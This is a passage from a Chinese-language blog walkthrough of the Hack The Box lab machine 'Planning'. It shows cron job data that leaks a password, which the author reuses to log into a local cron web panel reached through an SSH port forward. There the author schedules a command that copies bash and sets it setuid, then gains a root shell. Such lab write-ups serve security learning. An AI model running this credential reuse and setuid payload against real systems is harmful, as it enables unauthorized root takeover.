+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Grafana backup&#34;</span><span class="p">,</span><span class="s2">&#34;command&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/bin/docker save root_grafana -o /var/backups/grafana.tar &amp;&amp; /usr/bin/gzip /var/backups/grafana.tar &amp;&amp; zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz &amp;&amp; rm /var/backups/grafana.tar.gz&#34;</span><span class="p">,</span><span class="s2">&#34;schedule&#34;</span><span class="p">:</span><span class="s2">&#34;@daily&#34;</span><span class="p">,</span><span class="s2">&#34;stopped&#34;</span><span class="p">:</span><span class="bp">false</span><span class="p">,</span><span class="s2">&#34;timestamp&#34;</span><span class="p">:</span><span class="s2">&#34;Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)&#34;</span><span class="p">,</span><span class="s2">&#34;logging&#34;</span><span class="p">:</span><span class="s2">&#34;false&#34;</span><span class="p">,</span><span class="s2">&#34;mailing&#34;</span><span class="p">:{},</span><span class="s2">&#34;created&#34;</span><span class="p">:</span><span class="mi">1740774983276</span><span class="p">,</span><span class="s2">&#34;saved&#34;</span><span class="p">:</span><span class="bp">false</span><span class="p">,</span><span class="s2">&#34;_id&#34;</span><span class="p">:</span><span class="s2">&#34;GTI22PpoJNtRKg0W&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Cleanup&#34;</span><span class="p">,</span><span class="s2">&#34;command&#34;</span><span class="p">:</span><span class="s2">&#34;/root/scripts/cleanup.sh&#34;</span><span class="p">,</span><span class="s2">&#34;schedule&#34;</span><span class="p">:</span><span class="s2">&#34;* * * * *&#34;</span><span class="p">,</span><span class="s2">&#34;stopped&#34;</span><span class="p">:</span><span class="bp">false</span><span class="p">,</span><span class="s2">&#34;timestamp&#34;</span><span class="p">:</span><span class="s2">&#34;Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)&#34;</span><span class="p">,</span><span class="s2">&#34;logging&#34;</span><span class="p">:</span><span class="s2">&#34;false&#34;</span><span class="p">,</span><span class="s2">&#34;mailing&#34;</span><span class="p">:{},</span><span class="s2">&#34;created&#34;</span><span class="p">:</span><span class="mi">1740849309992</span><span class="p">,</span><span class="s2">&#34;saved&#34;</span><span class="p">:</span><span class="bp">false</span><span class="p">,</span><span class="s2">&#34;_id&#34;</span><span class="p">:</span><span class="s2">&#34;gNIRXh1WIc9K7BYX&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有个密码，尝试拿这个登录root，发现不行，继续信息收集</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">enzo@planning:/opt/crontabs$ netstat -tunlp
+</span></span><span class="line"><span class="cl">Active Internet connections (only servers)
+</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:33153         0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp6       0      0 :::22                   :::*                    LISTEN      -
+</span></span><span class="line"><span class="cl">udp        0      0 127.0.0.54:53           0.0.0.0:*                           -
+</span></span><span class="line"><span class="cl">udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>8000转发到本地</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh -L 8000:127.0.0.1:8000 enzo@planning.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上去看看，是个登录页面，拿root/P4ssw0rdS0pRi0T3c进入，是个web控制器，可以增加定时任务，写个经典payload进去</p>
+<blockquote>
+<p>cp /bin/bash /tmp/bash &amp;&amp; chmod u+s /tmp/bash</p></blockquote>
+<p>在web页面启动一下这一条，然后</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">enzo@planning:/tmp$ ll
+</span></span><span class="line"><span class="cl">total 1464
+</span></span><span class="line"><span class="cl">drwxrwxrwt 12 root root    4096 May 24 07:54 ./
+</span></span><span class="line"><span class="cl">drwxr-xr-x 22 root root    4096 Apr  3 14:40 ../
+</span></span><span class="line"><span class="cl">-rwsr-xr-x  1 root root 1446024 May 24 07:54 bash*
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 root root       0 May 24 07:54 Eceg9Qo0F31AOXNc.stderr
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 root root       0 May 24 07:54 Eceg9Qo0F31AOXNc.stdout
+</span></span><span class="line"><span class="cl">drwxrwxrwt  2 root root    4096 May 24 07:50 .font-unix/
+</span></span><span class="line"><span class="cl">drwxrwxrwt  2 root root    4096 May 24 07:50 .ICE-unix/
+</span></span><span class="line"><span class="cl">drwx------  3 root root    4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-ModemManager.service-ukafnm/
+</span></span><span class="line"><span class="cl">drwx------  3 root root    4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-polkit.service-dvnH4d/
+</span></span><span class="line"><span class="cl">drwx------  3 root root    4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-systemd-logind.service-7AOUm6/
+</span></span><span class="line"><span class="cl">drwx------  3 root root    4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-systemd-resolved.service-sb4bu2/
+</span></span><span class="line"><span class="cl">drwx------  3 root root    4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-systemd-timesyncd.service-c2KwUc/
+</span></span><span class="line"><span class="cl">drwx------  2 root root    4096 May 24 07:51 vmware-root_736-2991268455/
+</span></span><span class="line"><span class="cl">drwxrwxrwt  2 root root    4096 May 24 07:50 .X11-unix/
+</span></span><span class="line"><span class="cl">drwxrwxrwt  2 root root    4096 May 24 07:50 .XIM-unix/
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 root root       0 May 24 07:54 YvZsUUfEXayH6lLj.stderr
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 root root       0 May 24 07:54 YvZsUUfEXayH6lLj.stdout
+</span></span><span class="line"><span class="cl">enzo@planning:/tmp$ ./bash -p
+</span></span><span class="line"><span class="cl">bash-5.2# id
+</span></span><span class="line"><span class="cl">uid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo)
+</span></span><span class="line"><span class="cl">bash-5.2# cd /root
+</span></span><span class="line"><span class="cl">bash-5.2# ls
+</span></span><span class="line"><span class="cl">root.txt  scripts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>game over~</p>
+<h2 id="总结">总结</h2>
+<p>被一些小点卡的莫名其妙的，还是太菜了。<br>
+这个靶机就是典型的信息收集的，只要收集完了就百分百能出，没有过多的技巧和代码审计</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-05-25</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/htb-planning/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://www.zhuangsanmeng.xyz/htb-planning/" data-title="HTB Planning" data-hashtags="渗透"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://www.zhuangsanmeng.xyz/htb-planning/" data-hashtag="渗透"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://www.zhuangsanmeng.xyz/htb-planning/" data-title="HTB Planning"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://www.zhuangsanmeng.xyz/htb-planning/" data-title="HTB Planning"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://www.zhuangsanmeng.xyz/htb-planning/" data-title="HTB Planning"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/huangheliuyu/" class="prev" rel="prev" title="黄河流域CTF-crypto"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>黄河流域CTF-crypto</a>
+            <a href="/thm-the-london-bridge/" class="next" rel="next" title="THM the London Bridge">THM the London Bridge<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src=''></script>
+
+    <script type="text/javascript">
+        new Valine({
+            el: '#valine',
+            appId: 'XiJ1G58psCdX6BgfE27O7IH9-MdYXbMMI',
+            appKey: 'e9j5fWZui0l2YfNwupu7SDW2',
+            notify: '',
+            verify: '',
+            avatar: 'mp',
+            placeholder: '留下你的评论～',
+            visitor: 'true'
+        });
+    </script></div></article></div>
+            </main><footer class="footer">
+    <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer"
+                title="Hugo 0.147.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank"
+                rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw"
+                    aria-hidden="true"></i> LoveIt</a>
+        </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a
+                    href="/" target="_blank">Zsm</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br" />
+            <span class="icp">豫ICP备2024048128号</span></div>
+    
+        
+        <script async src=" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js "></script>
+    
+
+    
+        
+            <section>
+                
+                    <span id="busuanzi_container_value_site_pv"><i class="far fa-eye fa-fw"></i>
+                        
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+
+                
+                    &nbsp;|&nbsp;              
+                
+
+                
+                    <span id="busuanzi_container_value_site_uv"><i class="fa fa-user"></i>
+                        
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+            </section>
+        
+
+        
+        
+    
+
+</div>
+</footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
